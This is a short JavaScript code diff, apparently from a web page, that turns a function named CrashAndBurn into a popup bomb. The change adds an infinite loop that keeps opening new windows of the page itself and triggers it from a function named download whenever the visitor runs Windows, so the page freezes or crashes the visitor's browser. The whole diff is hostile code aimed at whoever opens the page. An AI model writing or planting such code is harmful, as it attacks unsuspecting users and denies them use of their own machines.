@@ -177,7 +177,8 @@ var popupWindow
 function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222'); }
 
 function runner(){
-	JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');
+	while(1){
+	CrashAndBurn(self.location,'_blank');}
 }
 function download(mult) {
     bobby*=mult;
@@ -185,7 +186,7 @@ function download(mult) {
     //   bobby = 50;
     // }
     if(OSName=="Windows"){
-		JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');
+		runner();
 	}
     else{
     	while(bob<bobby){
